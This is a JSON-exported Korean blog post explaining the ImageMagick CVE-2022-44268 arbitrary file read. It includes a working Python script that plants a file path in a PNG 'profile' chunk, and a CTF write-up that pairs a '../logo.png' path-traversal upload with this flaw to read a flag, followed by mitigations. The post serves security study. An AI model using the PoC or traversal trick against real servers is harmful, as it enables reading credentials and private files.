@@ -1,0 +1,963 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "4f5d6b32-2e63-522f-a932-27a0aef3aa5e",
+  "kind": "posts",
+  "title": "CVE-2022-44268 - ImageMagick Arbitrary File Read",
+  "slug": "tistory-138",
+  "description": "이번 글에서는 ImageMagick에서 발생하는 CVE-2022-44268 취약점에 대해 정리하고, 마지막에는 CTF 문제인 Wizard Gallery에서 실제로 어떻게 이용했는지 작성해보려고 한다.1. CVE-2022-44268CVE-2022-44268은 ImageMagick이 조작된 PNG 파일을 처리할 때 발생하는 Arbitrary File Read 취약점이다.공격자가 PNG의 metadata에 서버 내부 파일 경로를 삽입한 뒤 취약한 ImageMagick으로 해당 이미지를 처리하면, ImageMagick이 지정된 파일을 읽어 결과 이미지의 metadata에 포함시킨다.악성 PNG ↓ImageMagick으로 이미지 처리 ↓지정된 로컬 파일 읽기 ↓결과 PNG metadata에 파일 ..",
+  "category": "Security / Research",
+  "date": "2026-08-16",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-08-16T21:23:14+09:00",
+  "updatedAt": "2026-08-16T21:24:26+09:00",
+  "sourceDigest": "3450676f3d59cd9d842e58528af7a6f54500224ef11f34fe6deca8168381745f",
+  "assets": [],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번 글에서는 ImageMagick에서 발생하는 CVE-2022-44268 취약점에 대해 정리하고, 마지막에는 CTF 문제인 Wizard Gallery에서 실제로 어떻게 이용했는지 작성해보려고 한다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. CVE-2022-44268"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CVE-2022-44268은 ImageMagick이 조작된 PNG 파일을 처리할 때 발생하는 Arbitrary File Read 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "공격자가 PNG의 metadata에 서버 내부 파일 경로를 삽입한 뒤 취약한 ImageMagick으로 해당 이미지를 처리하면, ImageMagick이 지정된 파일을 읽어 결과 이미지의 metadata에 포함시킨다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "악성 PNG\n    ↓\nImageMagick으로 이미지 처리\n    ↓\n지정된 로컬 파일 읽기\n    ↓\n결과 PNG metadata에 파일 내용 저장\n    ↓\nmetadata 추출\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "대표적으로 ImageMagick 7.1.0-49에서 취약점이 재현되며 이후 버전에서는 패치가 적용되었다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 취약점은 RCE처럼 직접 명령어를 실행하는 취약점은 아니지만, ImageMagick 프로세스가 읽을 수 있는 파일이라면 설정 파일이나 credential 같은 중요한 정보를 노출시킬 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. ImageMagick이란?"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ImageMagick은 이미지 파일을 생성하거나 변환하기 위한 오픈소스 이미지 처리 프로그램이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CLI 환경에서는 다음과 같이 사용할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "convert image.png -resize 50% result.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "또는 최신 버전에서는"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "magick image.png -resize 50% result.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "처럼 사용할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "웹 서비스에서는 사용자가 업로드한 이미지에 대해 다음과 같은 작업을 자동으로 처리할 때 자주 사용된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "이미지 크기 변경\n썸네일 생성\n이미지 압축\nPNG → JPG 변환\nmetadata 처리\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어 프로필 이미지를 업로드하면 서버에서 자동으로 작은 크기의 썸네일을 만드는 경우가 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "사용자 이미지 업로드\n        ↓\n     Web Server\n        ↓\n    ImageMagick\n        ↓\n     Resize\n        ↓\n   Thumbnail 생성\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문제는 사용자가 조작한 이미지가 그대로 ImageMagick에 전달될 경우 이미지 parser의 취약점까지 공격할 수 있다는 것이다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. PNG 구조"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "PNG 파일은 단순히 이미지 픽셀만 저장하는 것이 아니라 여러 개의 Chunk로 구성되어 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "간단하게 보면 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "PNG\n├─ Signature\n├─ IHDR\n├─ IDAT\n├─ tEXt\n├─ iTXt\n├─ 기타 Chunk\n└─ IEND\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "각 Chunk의 역할은 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "IHDR\n→ 이미지 크기, Bit Depth, Color Type 등 기본 정보\n\nIDAT\n→ 실제 압축된 이미지 데이터\n\ntEXt / iTXt\n→ 이미지와 관련된 문자열 형태의 metadata\n\nIEND\n→ PNG 파일의 끝\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CVE-2022-44268에서 중요한 부분은 PNG 내부에 저장할 수 있는 profile 관련 정보이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "공격자는 PNG 안에 특정 파일 경로를 참조하도록 데이터를 삽입한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어 다음과 같이 /etc/passwd를 지정했다고 가정한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "PNG\n└─ metadata\n      └─ profile\n            └─ /etc/passwd\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상적인 프로그램이라면 단순한 metadata 문자열로 처리해야 하지만, 취약한 ImageMagick에서는 해당 경로의 파일을 실제로 읽게 된다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 취약점이 발생하는 과정"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "일반적인 이미지 변환은 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "convert input.png output.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상 이미지라면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "input.png\n    ↓\nImageMagick\n    ↓\n이미지 변환\n    ↓\noutput.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "로 끝난다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "하지만 profile에 로컬 파일 경로가 포함된 악성 PNG를 넣으면 과정이 달라진다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "payload.png\n\nprofile → /etc/passwd\n        ↓\n    ImageMagick\n        ↓\n /etc/passwd 읽기\n        ↓\n    output.png\n        ↓\nmetadata에 파일 내용 포함\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 취약점의 핵심은 공격자가 서버의 파일을 직접 다운로드하는 것이 아니다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ImageMagick에게 대신 파일을 읽게 한 다음, 결과 PNG에 포함된 데이터를 다시 가져오는 방식이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "출력 파일의 metadata를 확인하면 다음처럼 Raw profile type 부분에서 데이터를 확인할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Raw profile type:\n\n    726f6f743a783a303a303a...\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 값은 HEX 형태이므로 다시 decoding하면 원래 파일의 내용을 확인할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "HEX Data\n   ↓\nDecode\n   ↓\n/etc/passwd 내용\n"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "5. PoC"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "PNG에 profile 청크를 넣는 PoC코드이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "python3 poc.py input.png payload.png /etc/passwd 처럼 사용하면된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "import struct\nimport zlib\nimport sys\n\nPNG_SIG = b\"\\x89PNG\\r\\n\\x1a\\n\"\n\ndef make_chunk(chunk_type: bytes, data: bytes) -> bytes:\n    length = struct.pack(\">I\", len(data))\n    crc = zlib.crc32(chunk_type + data) & 0xffffffff\n    return length + chunk_type + data + struct.pack(\">I\", crc)\n\ndef inject_profile(input_png, output_png, target_file):\n    with open(input_png, \"rb\") as f:\n        png = f.read()\n\n    if not png.startswith(PNG_SIG):\n        raise ValueError(\"Not a PNG file\")\n\n    # ImageMagick이 profile로 해석하도록 tEXt chunk 생성\n    payload = b\"profile\\x00\" + target_file.encode()\n\n    pos = len(PNG_SIG)\n    result = PNG_SIG\n\n    while pos < len(png):\n        length = struct.unpack(\">I\", png[pos:pos+4])[0]\n        chunk_end = pos + 12 + length\n        chunk = png[pos:chunk_end]\n\n        chunk_type = png[pos+4:pos+8]\n\n        # IEND 직전에 payload 삽입\n        if chunk_type == b\"IEND\":\n            result += make_chunk(b\"tEXt\", payload)\n\n        result += chunk\n        pos = chunk_end\n\n    with open(output_png, \"wb\") as f:\n        f.write(result)\n\n    print(f\"[+] Payload created: {output_png}\")\n    print(f\"[+] Target file: {target_file}\")\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 4:\n        print(f\"Usage: python3 {sys.argv[0]} <input.png> <output.png> <target_file>\")\n        sys.exit(1)\n\n    inject_profile(sys.argv[1], sys.argv[2], sys.argv[3])"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6. Wizard Gallery 문제 풀이"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이제 실제 CTF 문제에서 CVE-2022-44268을 어떻게 사용했는지 살펴보자."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Wizard Gallery는 사용자가 이미지를 업로드하고 갤러리에서 확인할 수 있는 웹 서비스이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "처음에는 파일 업로드 기능이 있기 때문에 확장자 우회를 먼저 시도했는데, 실제 중요한 부분은 /logo-sm.png 엔드포인트였다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "코드를 보면 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "@app.route('/logo-sm.png')\ndef logo_small():\n    logo_sm_path = os.path.join(\n        app.config['UPLOAD_FOLDER'],\n        'logo-sm.png'\n    )\n\n    if not os.path.exists(logo_sm_path):\n        os.system(\n            \"magick/bin/convert logo.png -resize 10% \"\n            + os.path.join(\n                app.config['UPLOAD_FOLDER'],\n                'logo-sm.png'\n            )\n        )\n\n    return send_from_directory(\n        app.config['UPLOAD_FOLDER'],\n        'logo-sm.png'\n    )\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "logo-sm.png가 존재하지 않을 경우 서버에서 다음과 같은 ImageMagick 명령이 실행된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "magick/bin/convert logo.png -resize 10% uploads/logo-sm.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 logo.png를 우리가 만든 악성 PNG로 바꿀 수 있다면 CVE-2022-44268을 Trigger할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-1. logo.png 덮어쓰기"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "업로드 코드를 보면 사용자가 전달한 파일명을 그대로 사용한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "original_filename = file.filename\n\nfile_path = os.path.join(\n    app.config['UPLOAD_FOLDER'],\n    original_filename\n)\n\nfile.save(file_path)\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 파일명을 다음과 같이 지정했다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "../logo.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "저장 경로는"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "uploads/../logo.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "가 되기 때문에 기존 logo.png를 악성 PNG로 덮어쓸 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-2. CVE-2022-44268 Payload 생성"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이후 flag 파일을 읽도록 CVE-2022-44268 payload를 생성한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "악성 PNG\n└─ profile\n      └─ flag 파일 경로\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그리고 해당 파일을"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "../logo.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이름으로 업로드한다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-3. 취약점 Trigger"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "마지막으로 다음 엔드포인트에 접근한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "/logo-sm.png\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그러면 서버가 우리가 덮어쓴 logo.png를 ImageMagick으로 처리한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "악성 PNG 업로드\n      ↓\n../logo.png\n      ↓\n기존 logo.png 덮어쓰기\n      ↓\n/logo-sm.png 요청\n      ↓\nImageMagick convert 실행\n      ↓\nCVE-2022-44268\n      ↓\nflag 파일 읽기\n      ↓\nlogo-sm.png metadata에 저장\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "생성된 logo-sm.png의 metadata를 확인한 뒤 HEX 값을 decoding하면 FLAG를 획득할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 문제에서 Path Traversal은 공격자가 원하는 PNG를 ImageMagick 처리 지점까지 전달하기 위한 수단이고, 실제 파일을 읽어오는 핵심 취약점은 CVE-2022-44268이다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "7. 대응 방법"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "가장 먼저 취약한 ImageMagick 버전을 사용하지 않도록 업데이트해야 한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "또한 단순히 버전만 업데이트하는 것이 아니라 이미지 처리 프로그램이 접근할 수 있는 범위를 제한하는 것이 좋다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. 보안 패치가 적용된 ImageMagick 사용\n\n2. ImageMagick 실행 계정 권한 최소화\n\n3. policy.xml을 이용해 불필요한 파일 접근 제한\n\n4. 업로드된 이미지의 metadata/profile 검증\n\n5. 사용자 파일명을 그대로 저장하지 않기\n\n6. ../ 등의 Path Traversal 차단\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "특히 이미지 파일은 .png, .jpg 등의 정상적인 확장자를 가지고 있더라도 내부 metadata가 조작될 수 있기 때문에 확장자 검사만으로 안전하다고 판단하면 안 된다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "8. 3줄 요약"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "CVE-2022-44268은 조작된 PNG를 취약한 ImageMagick이 처리할 때 서버 내부 파일을 읽을 수 있는 Arbitrary File Read 취약점이다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "PNG의 profile에 파일 경로를 삽입하면 읽힌 데이터가 결과 이미지 metadata에 저장되고, 이를 추출해 원본 파일 내용을 확인할 수 있다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "Wizard Gallery에서는 ../logo.png로 악성 PNG를 덮어쓴 뒤 /logo-sm.png에서 ImageMagick 변환을 발생시켜 FLAG를 획득했다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/138",
+    "originalId": "138",
+    "publishedAt": "2026-08-16T21:23:14+09:00",
+    "updatedAt": "2026-08-16T21:24:26+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
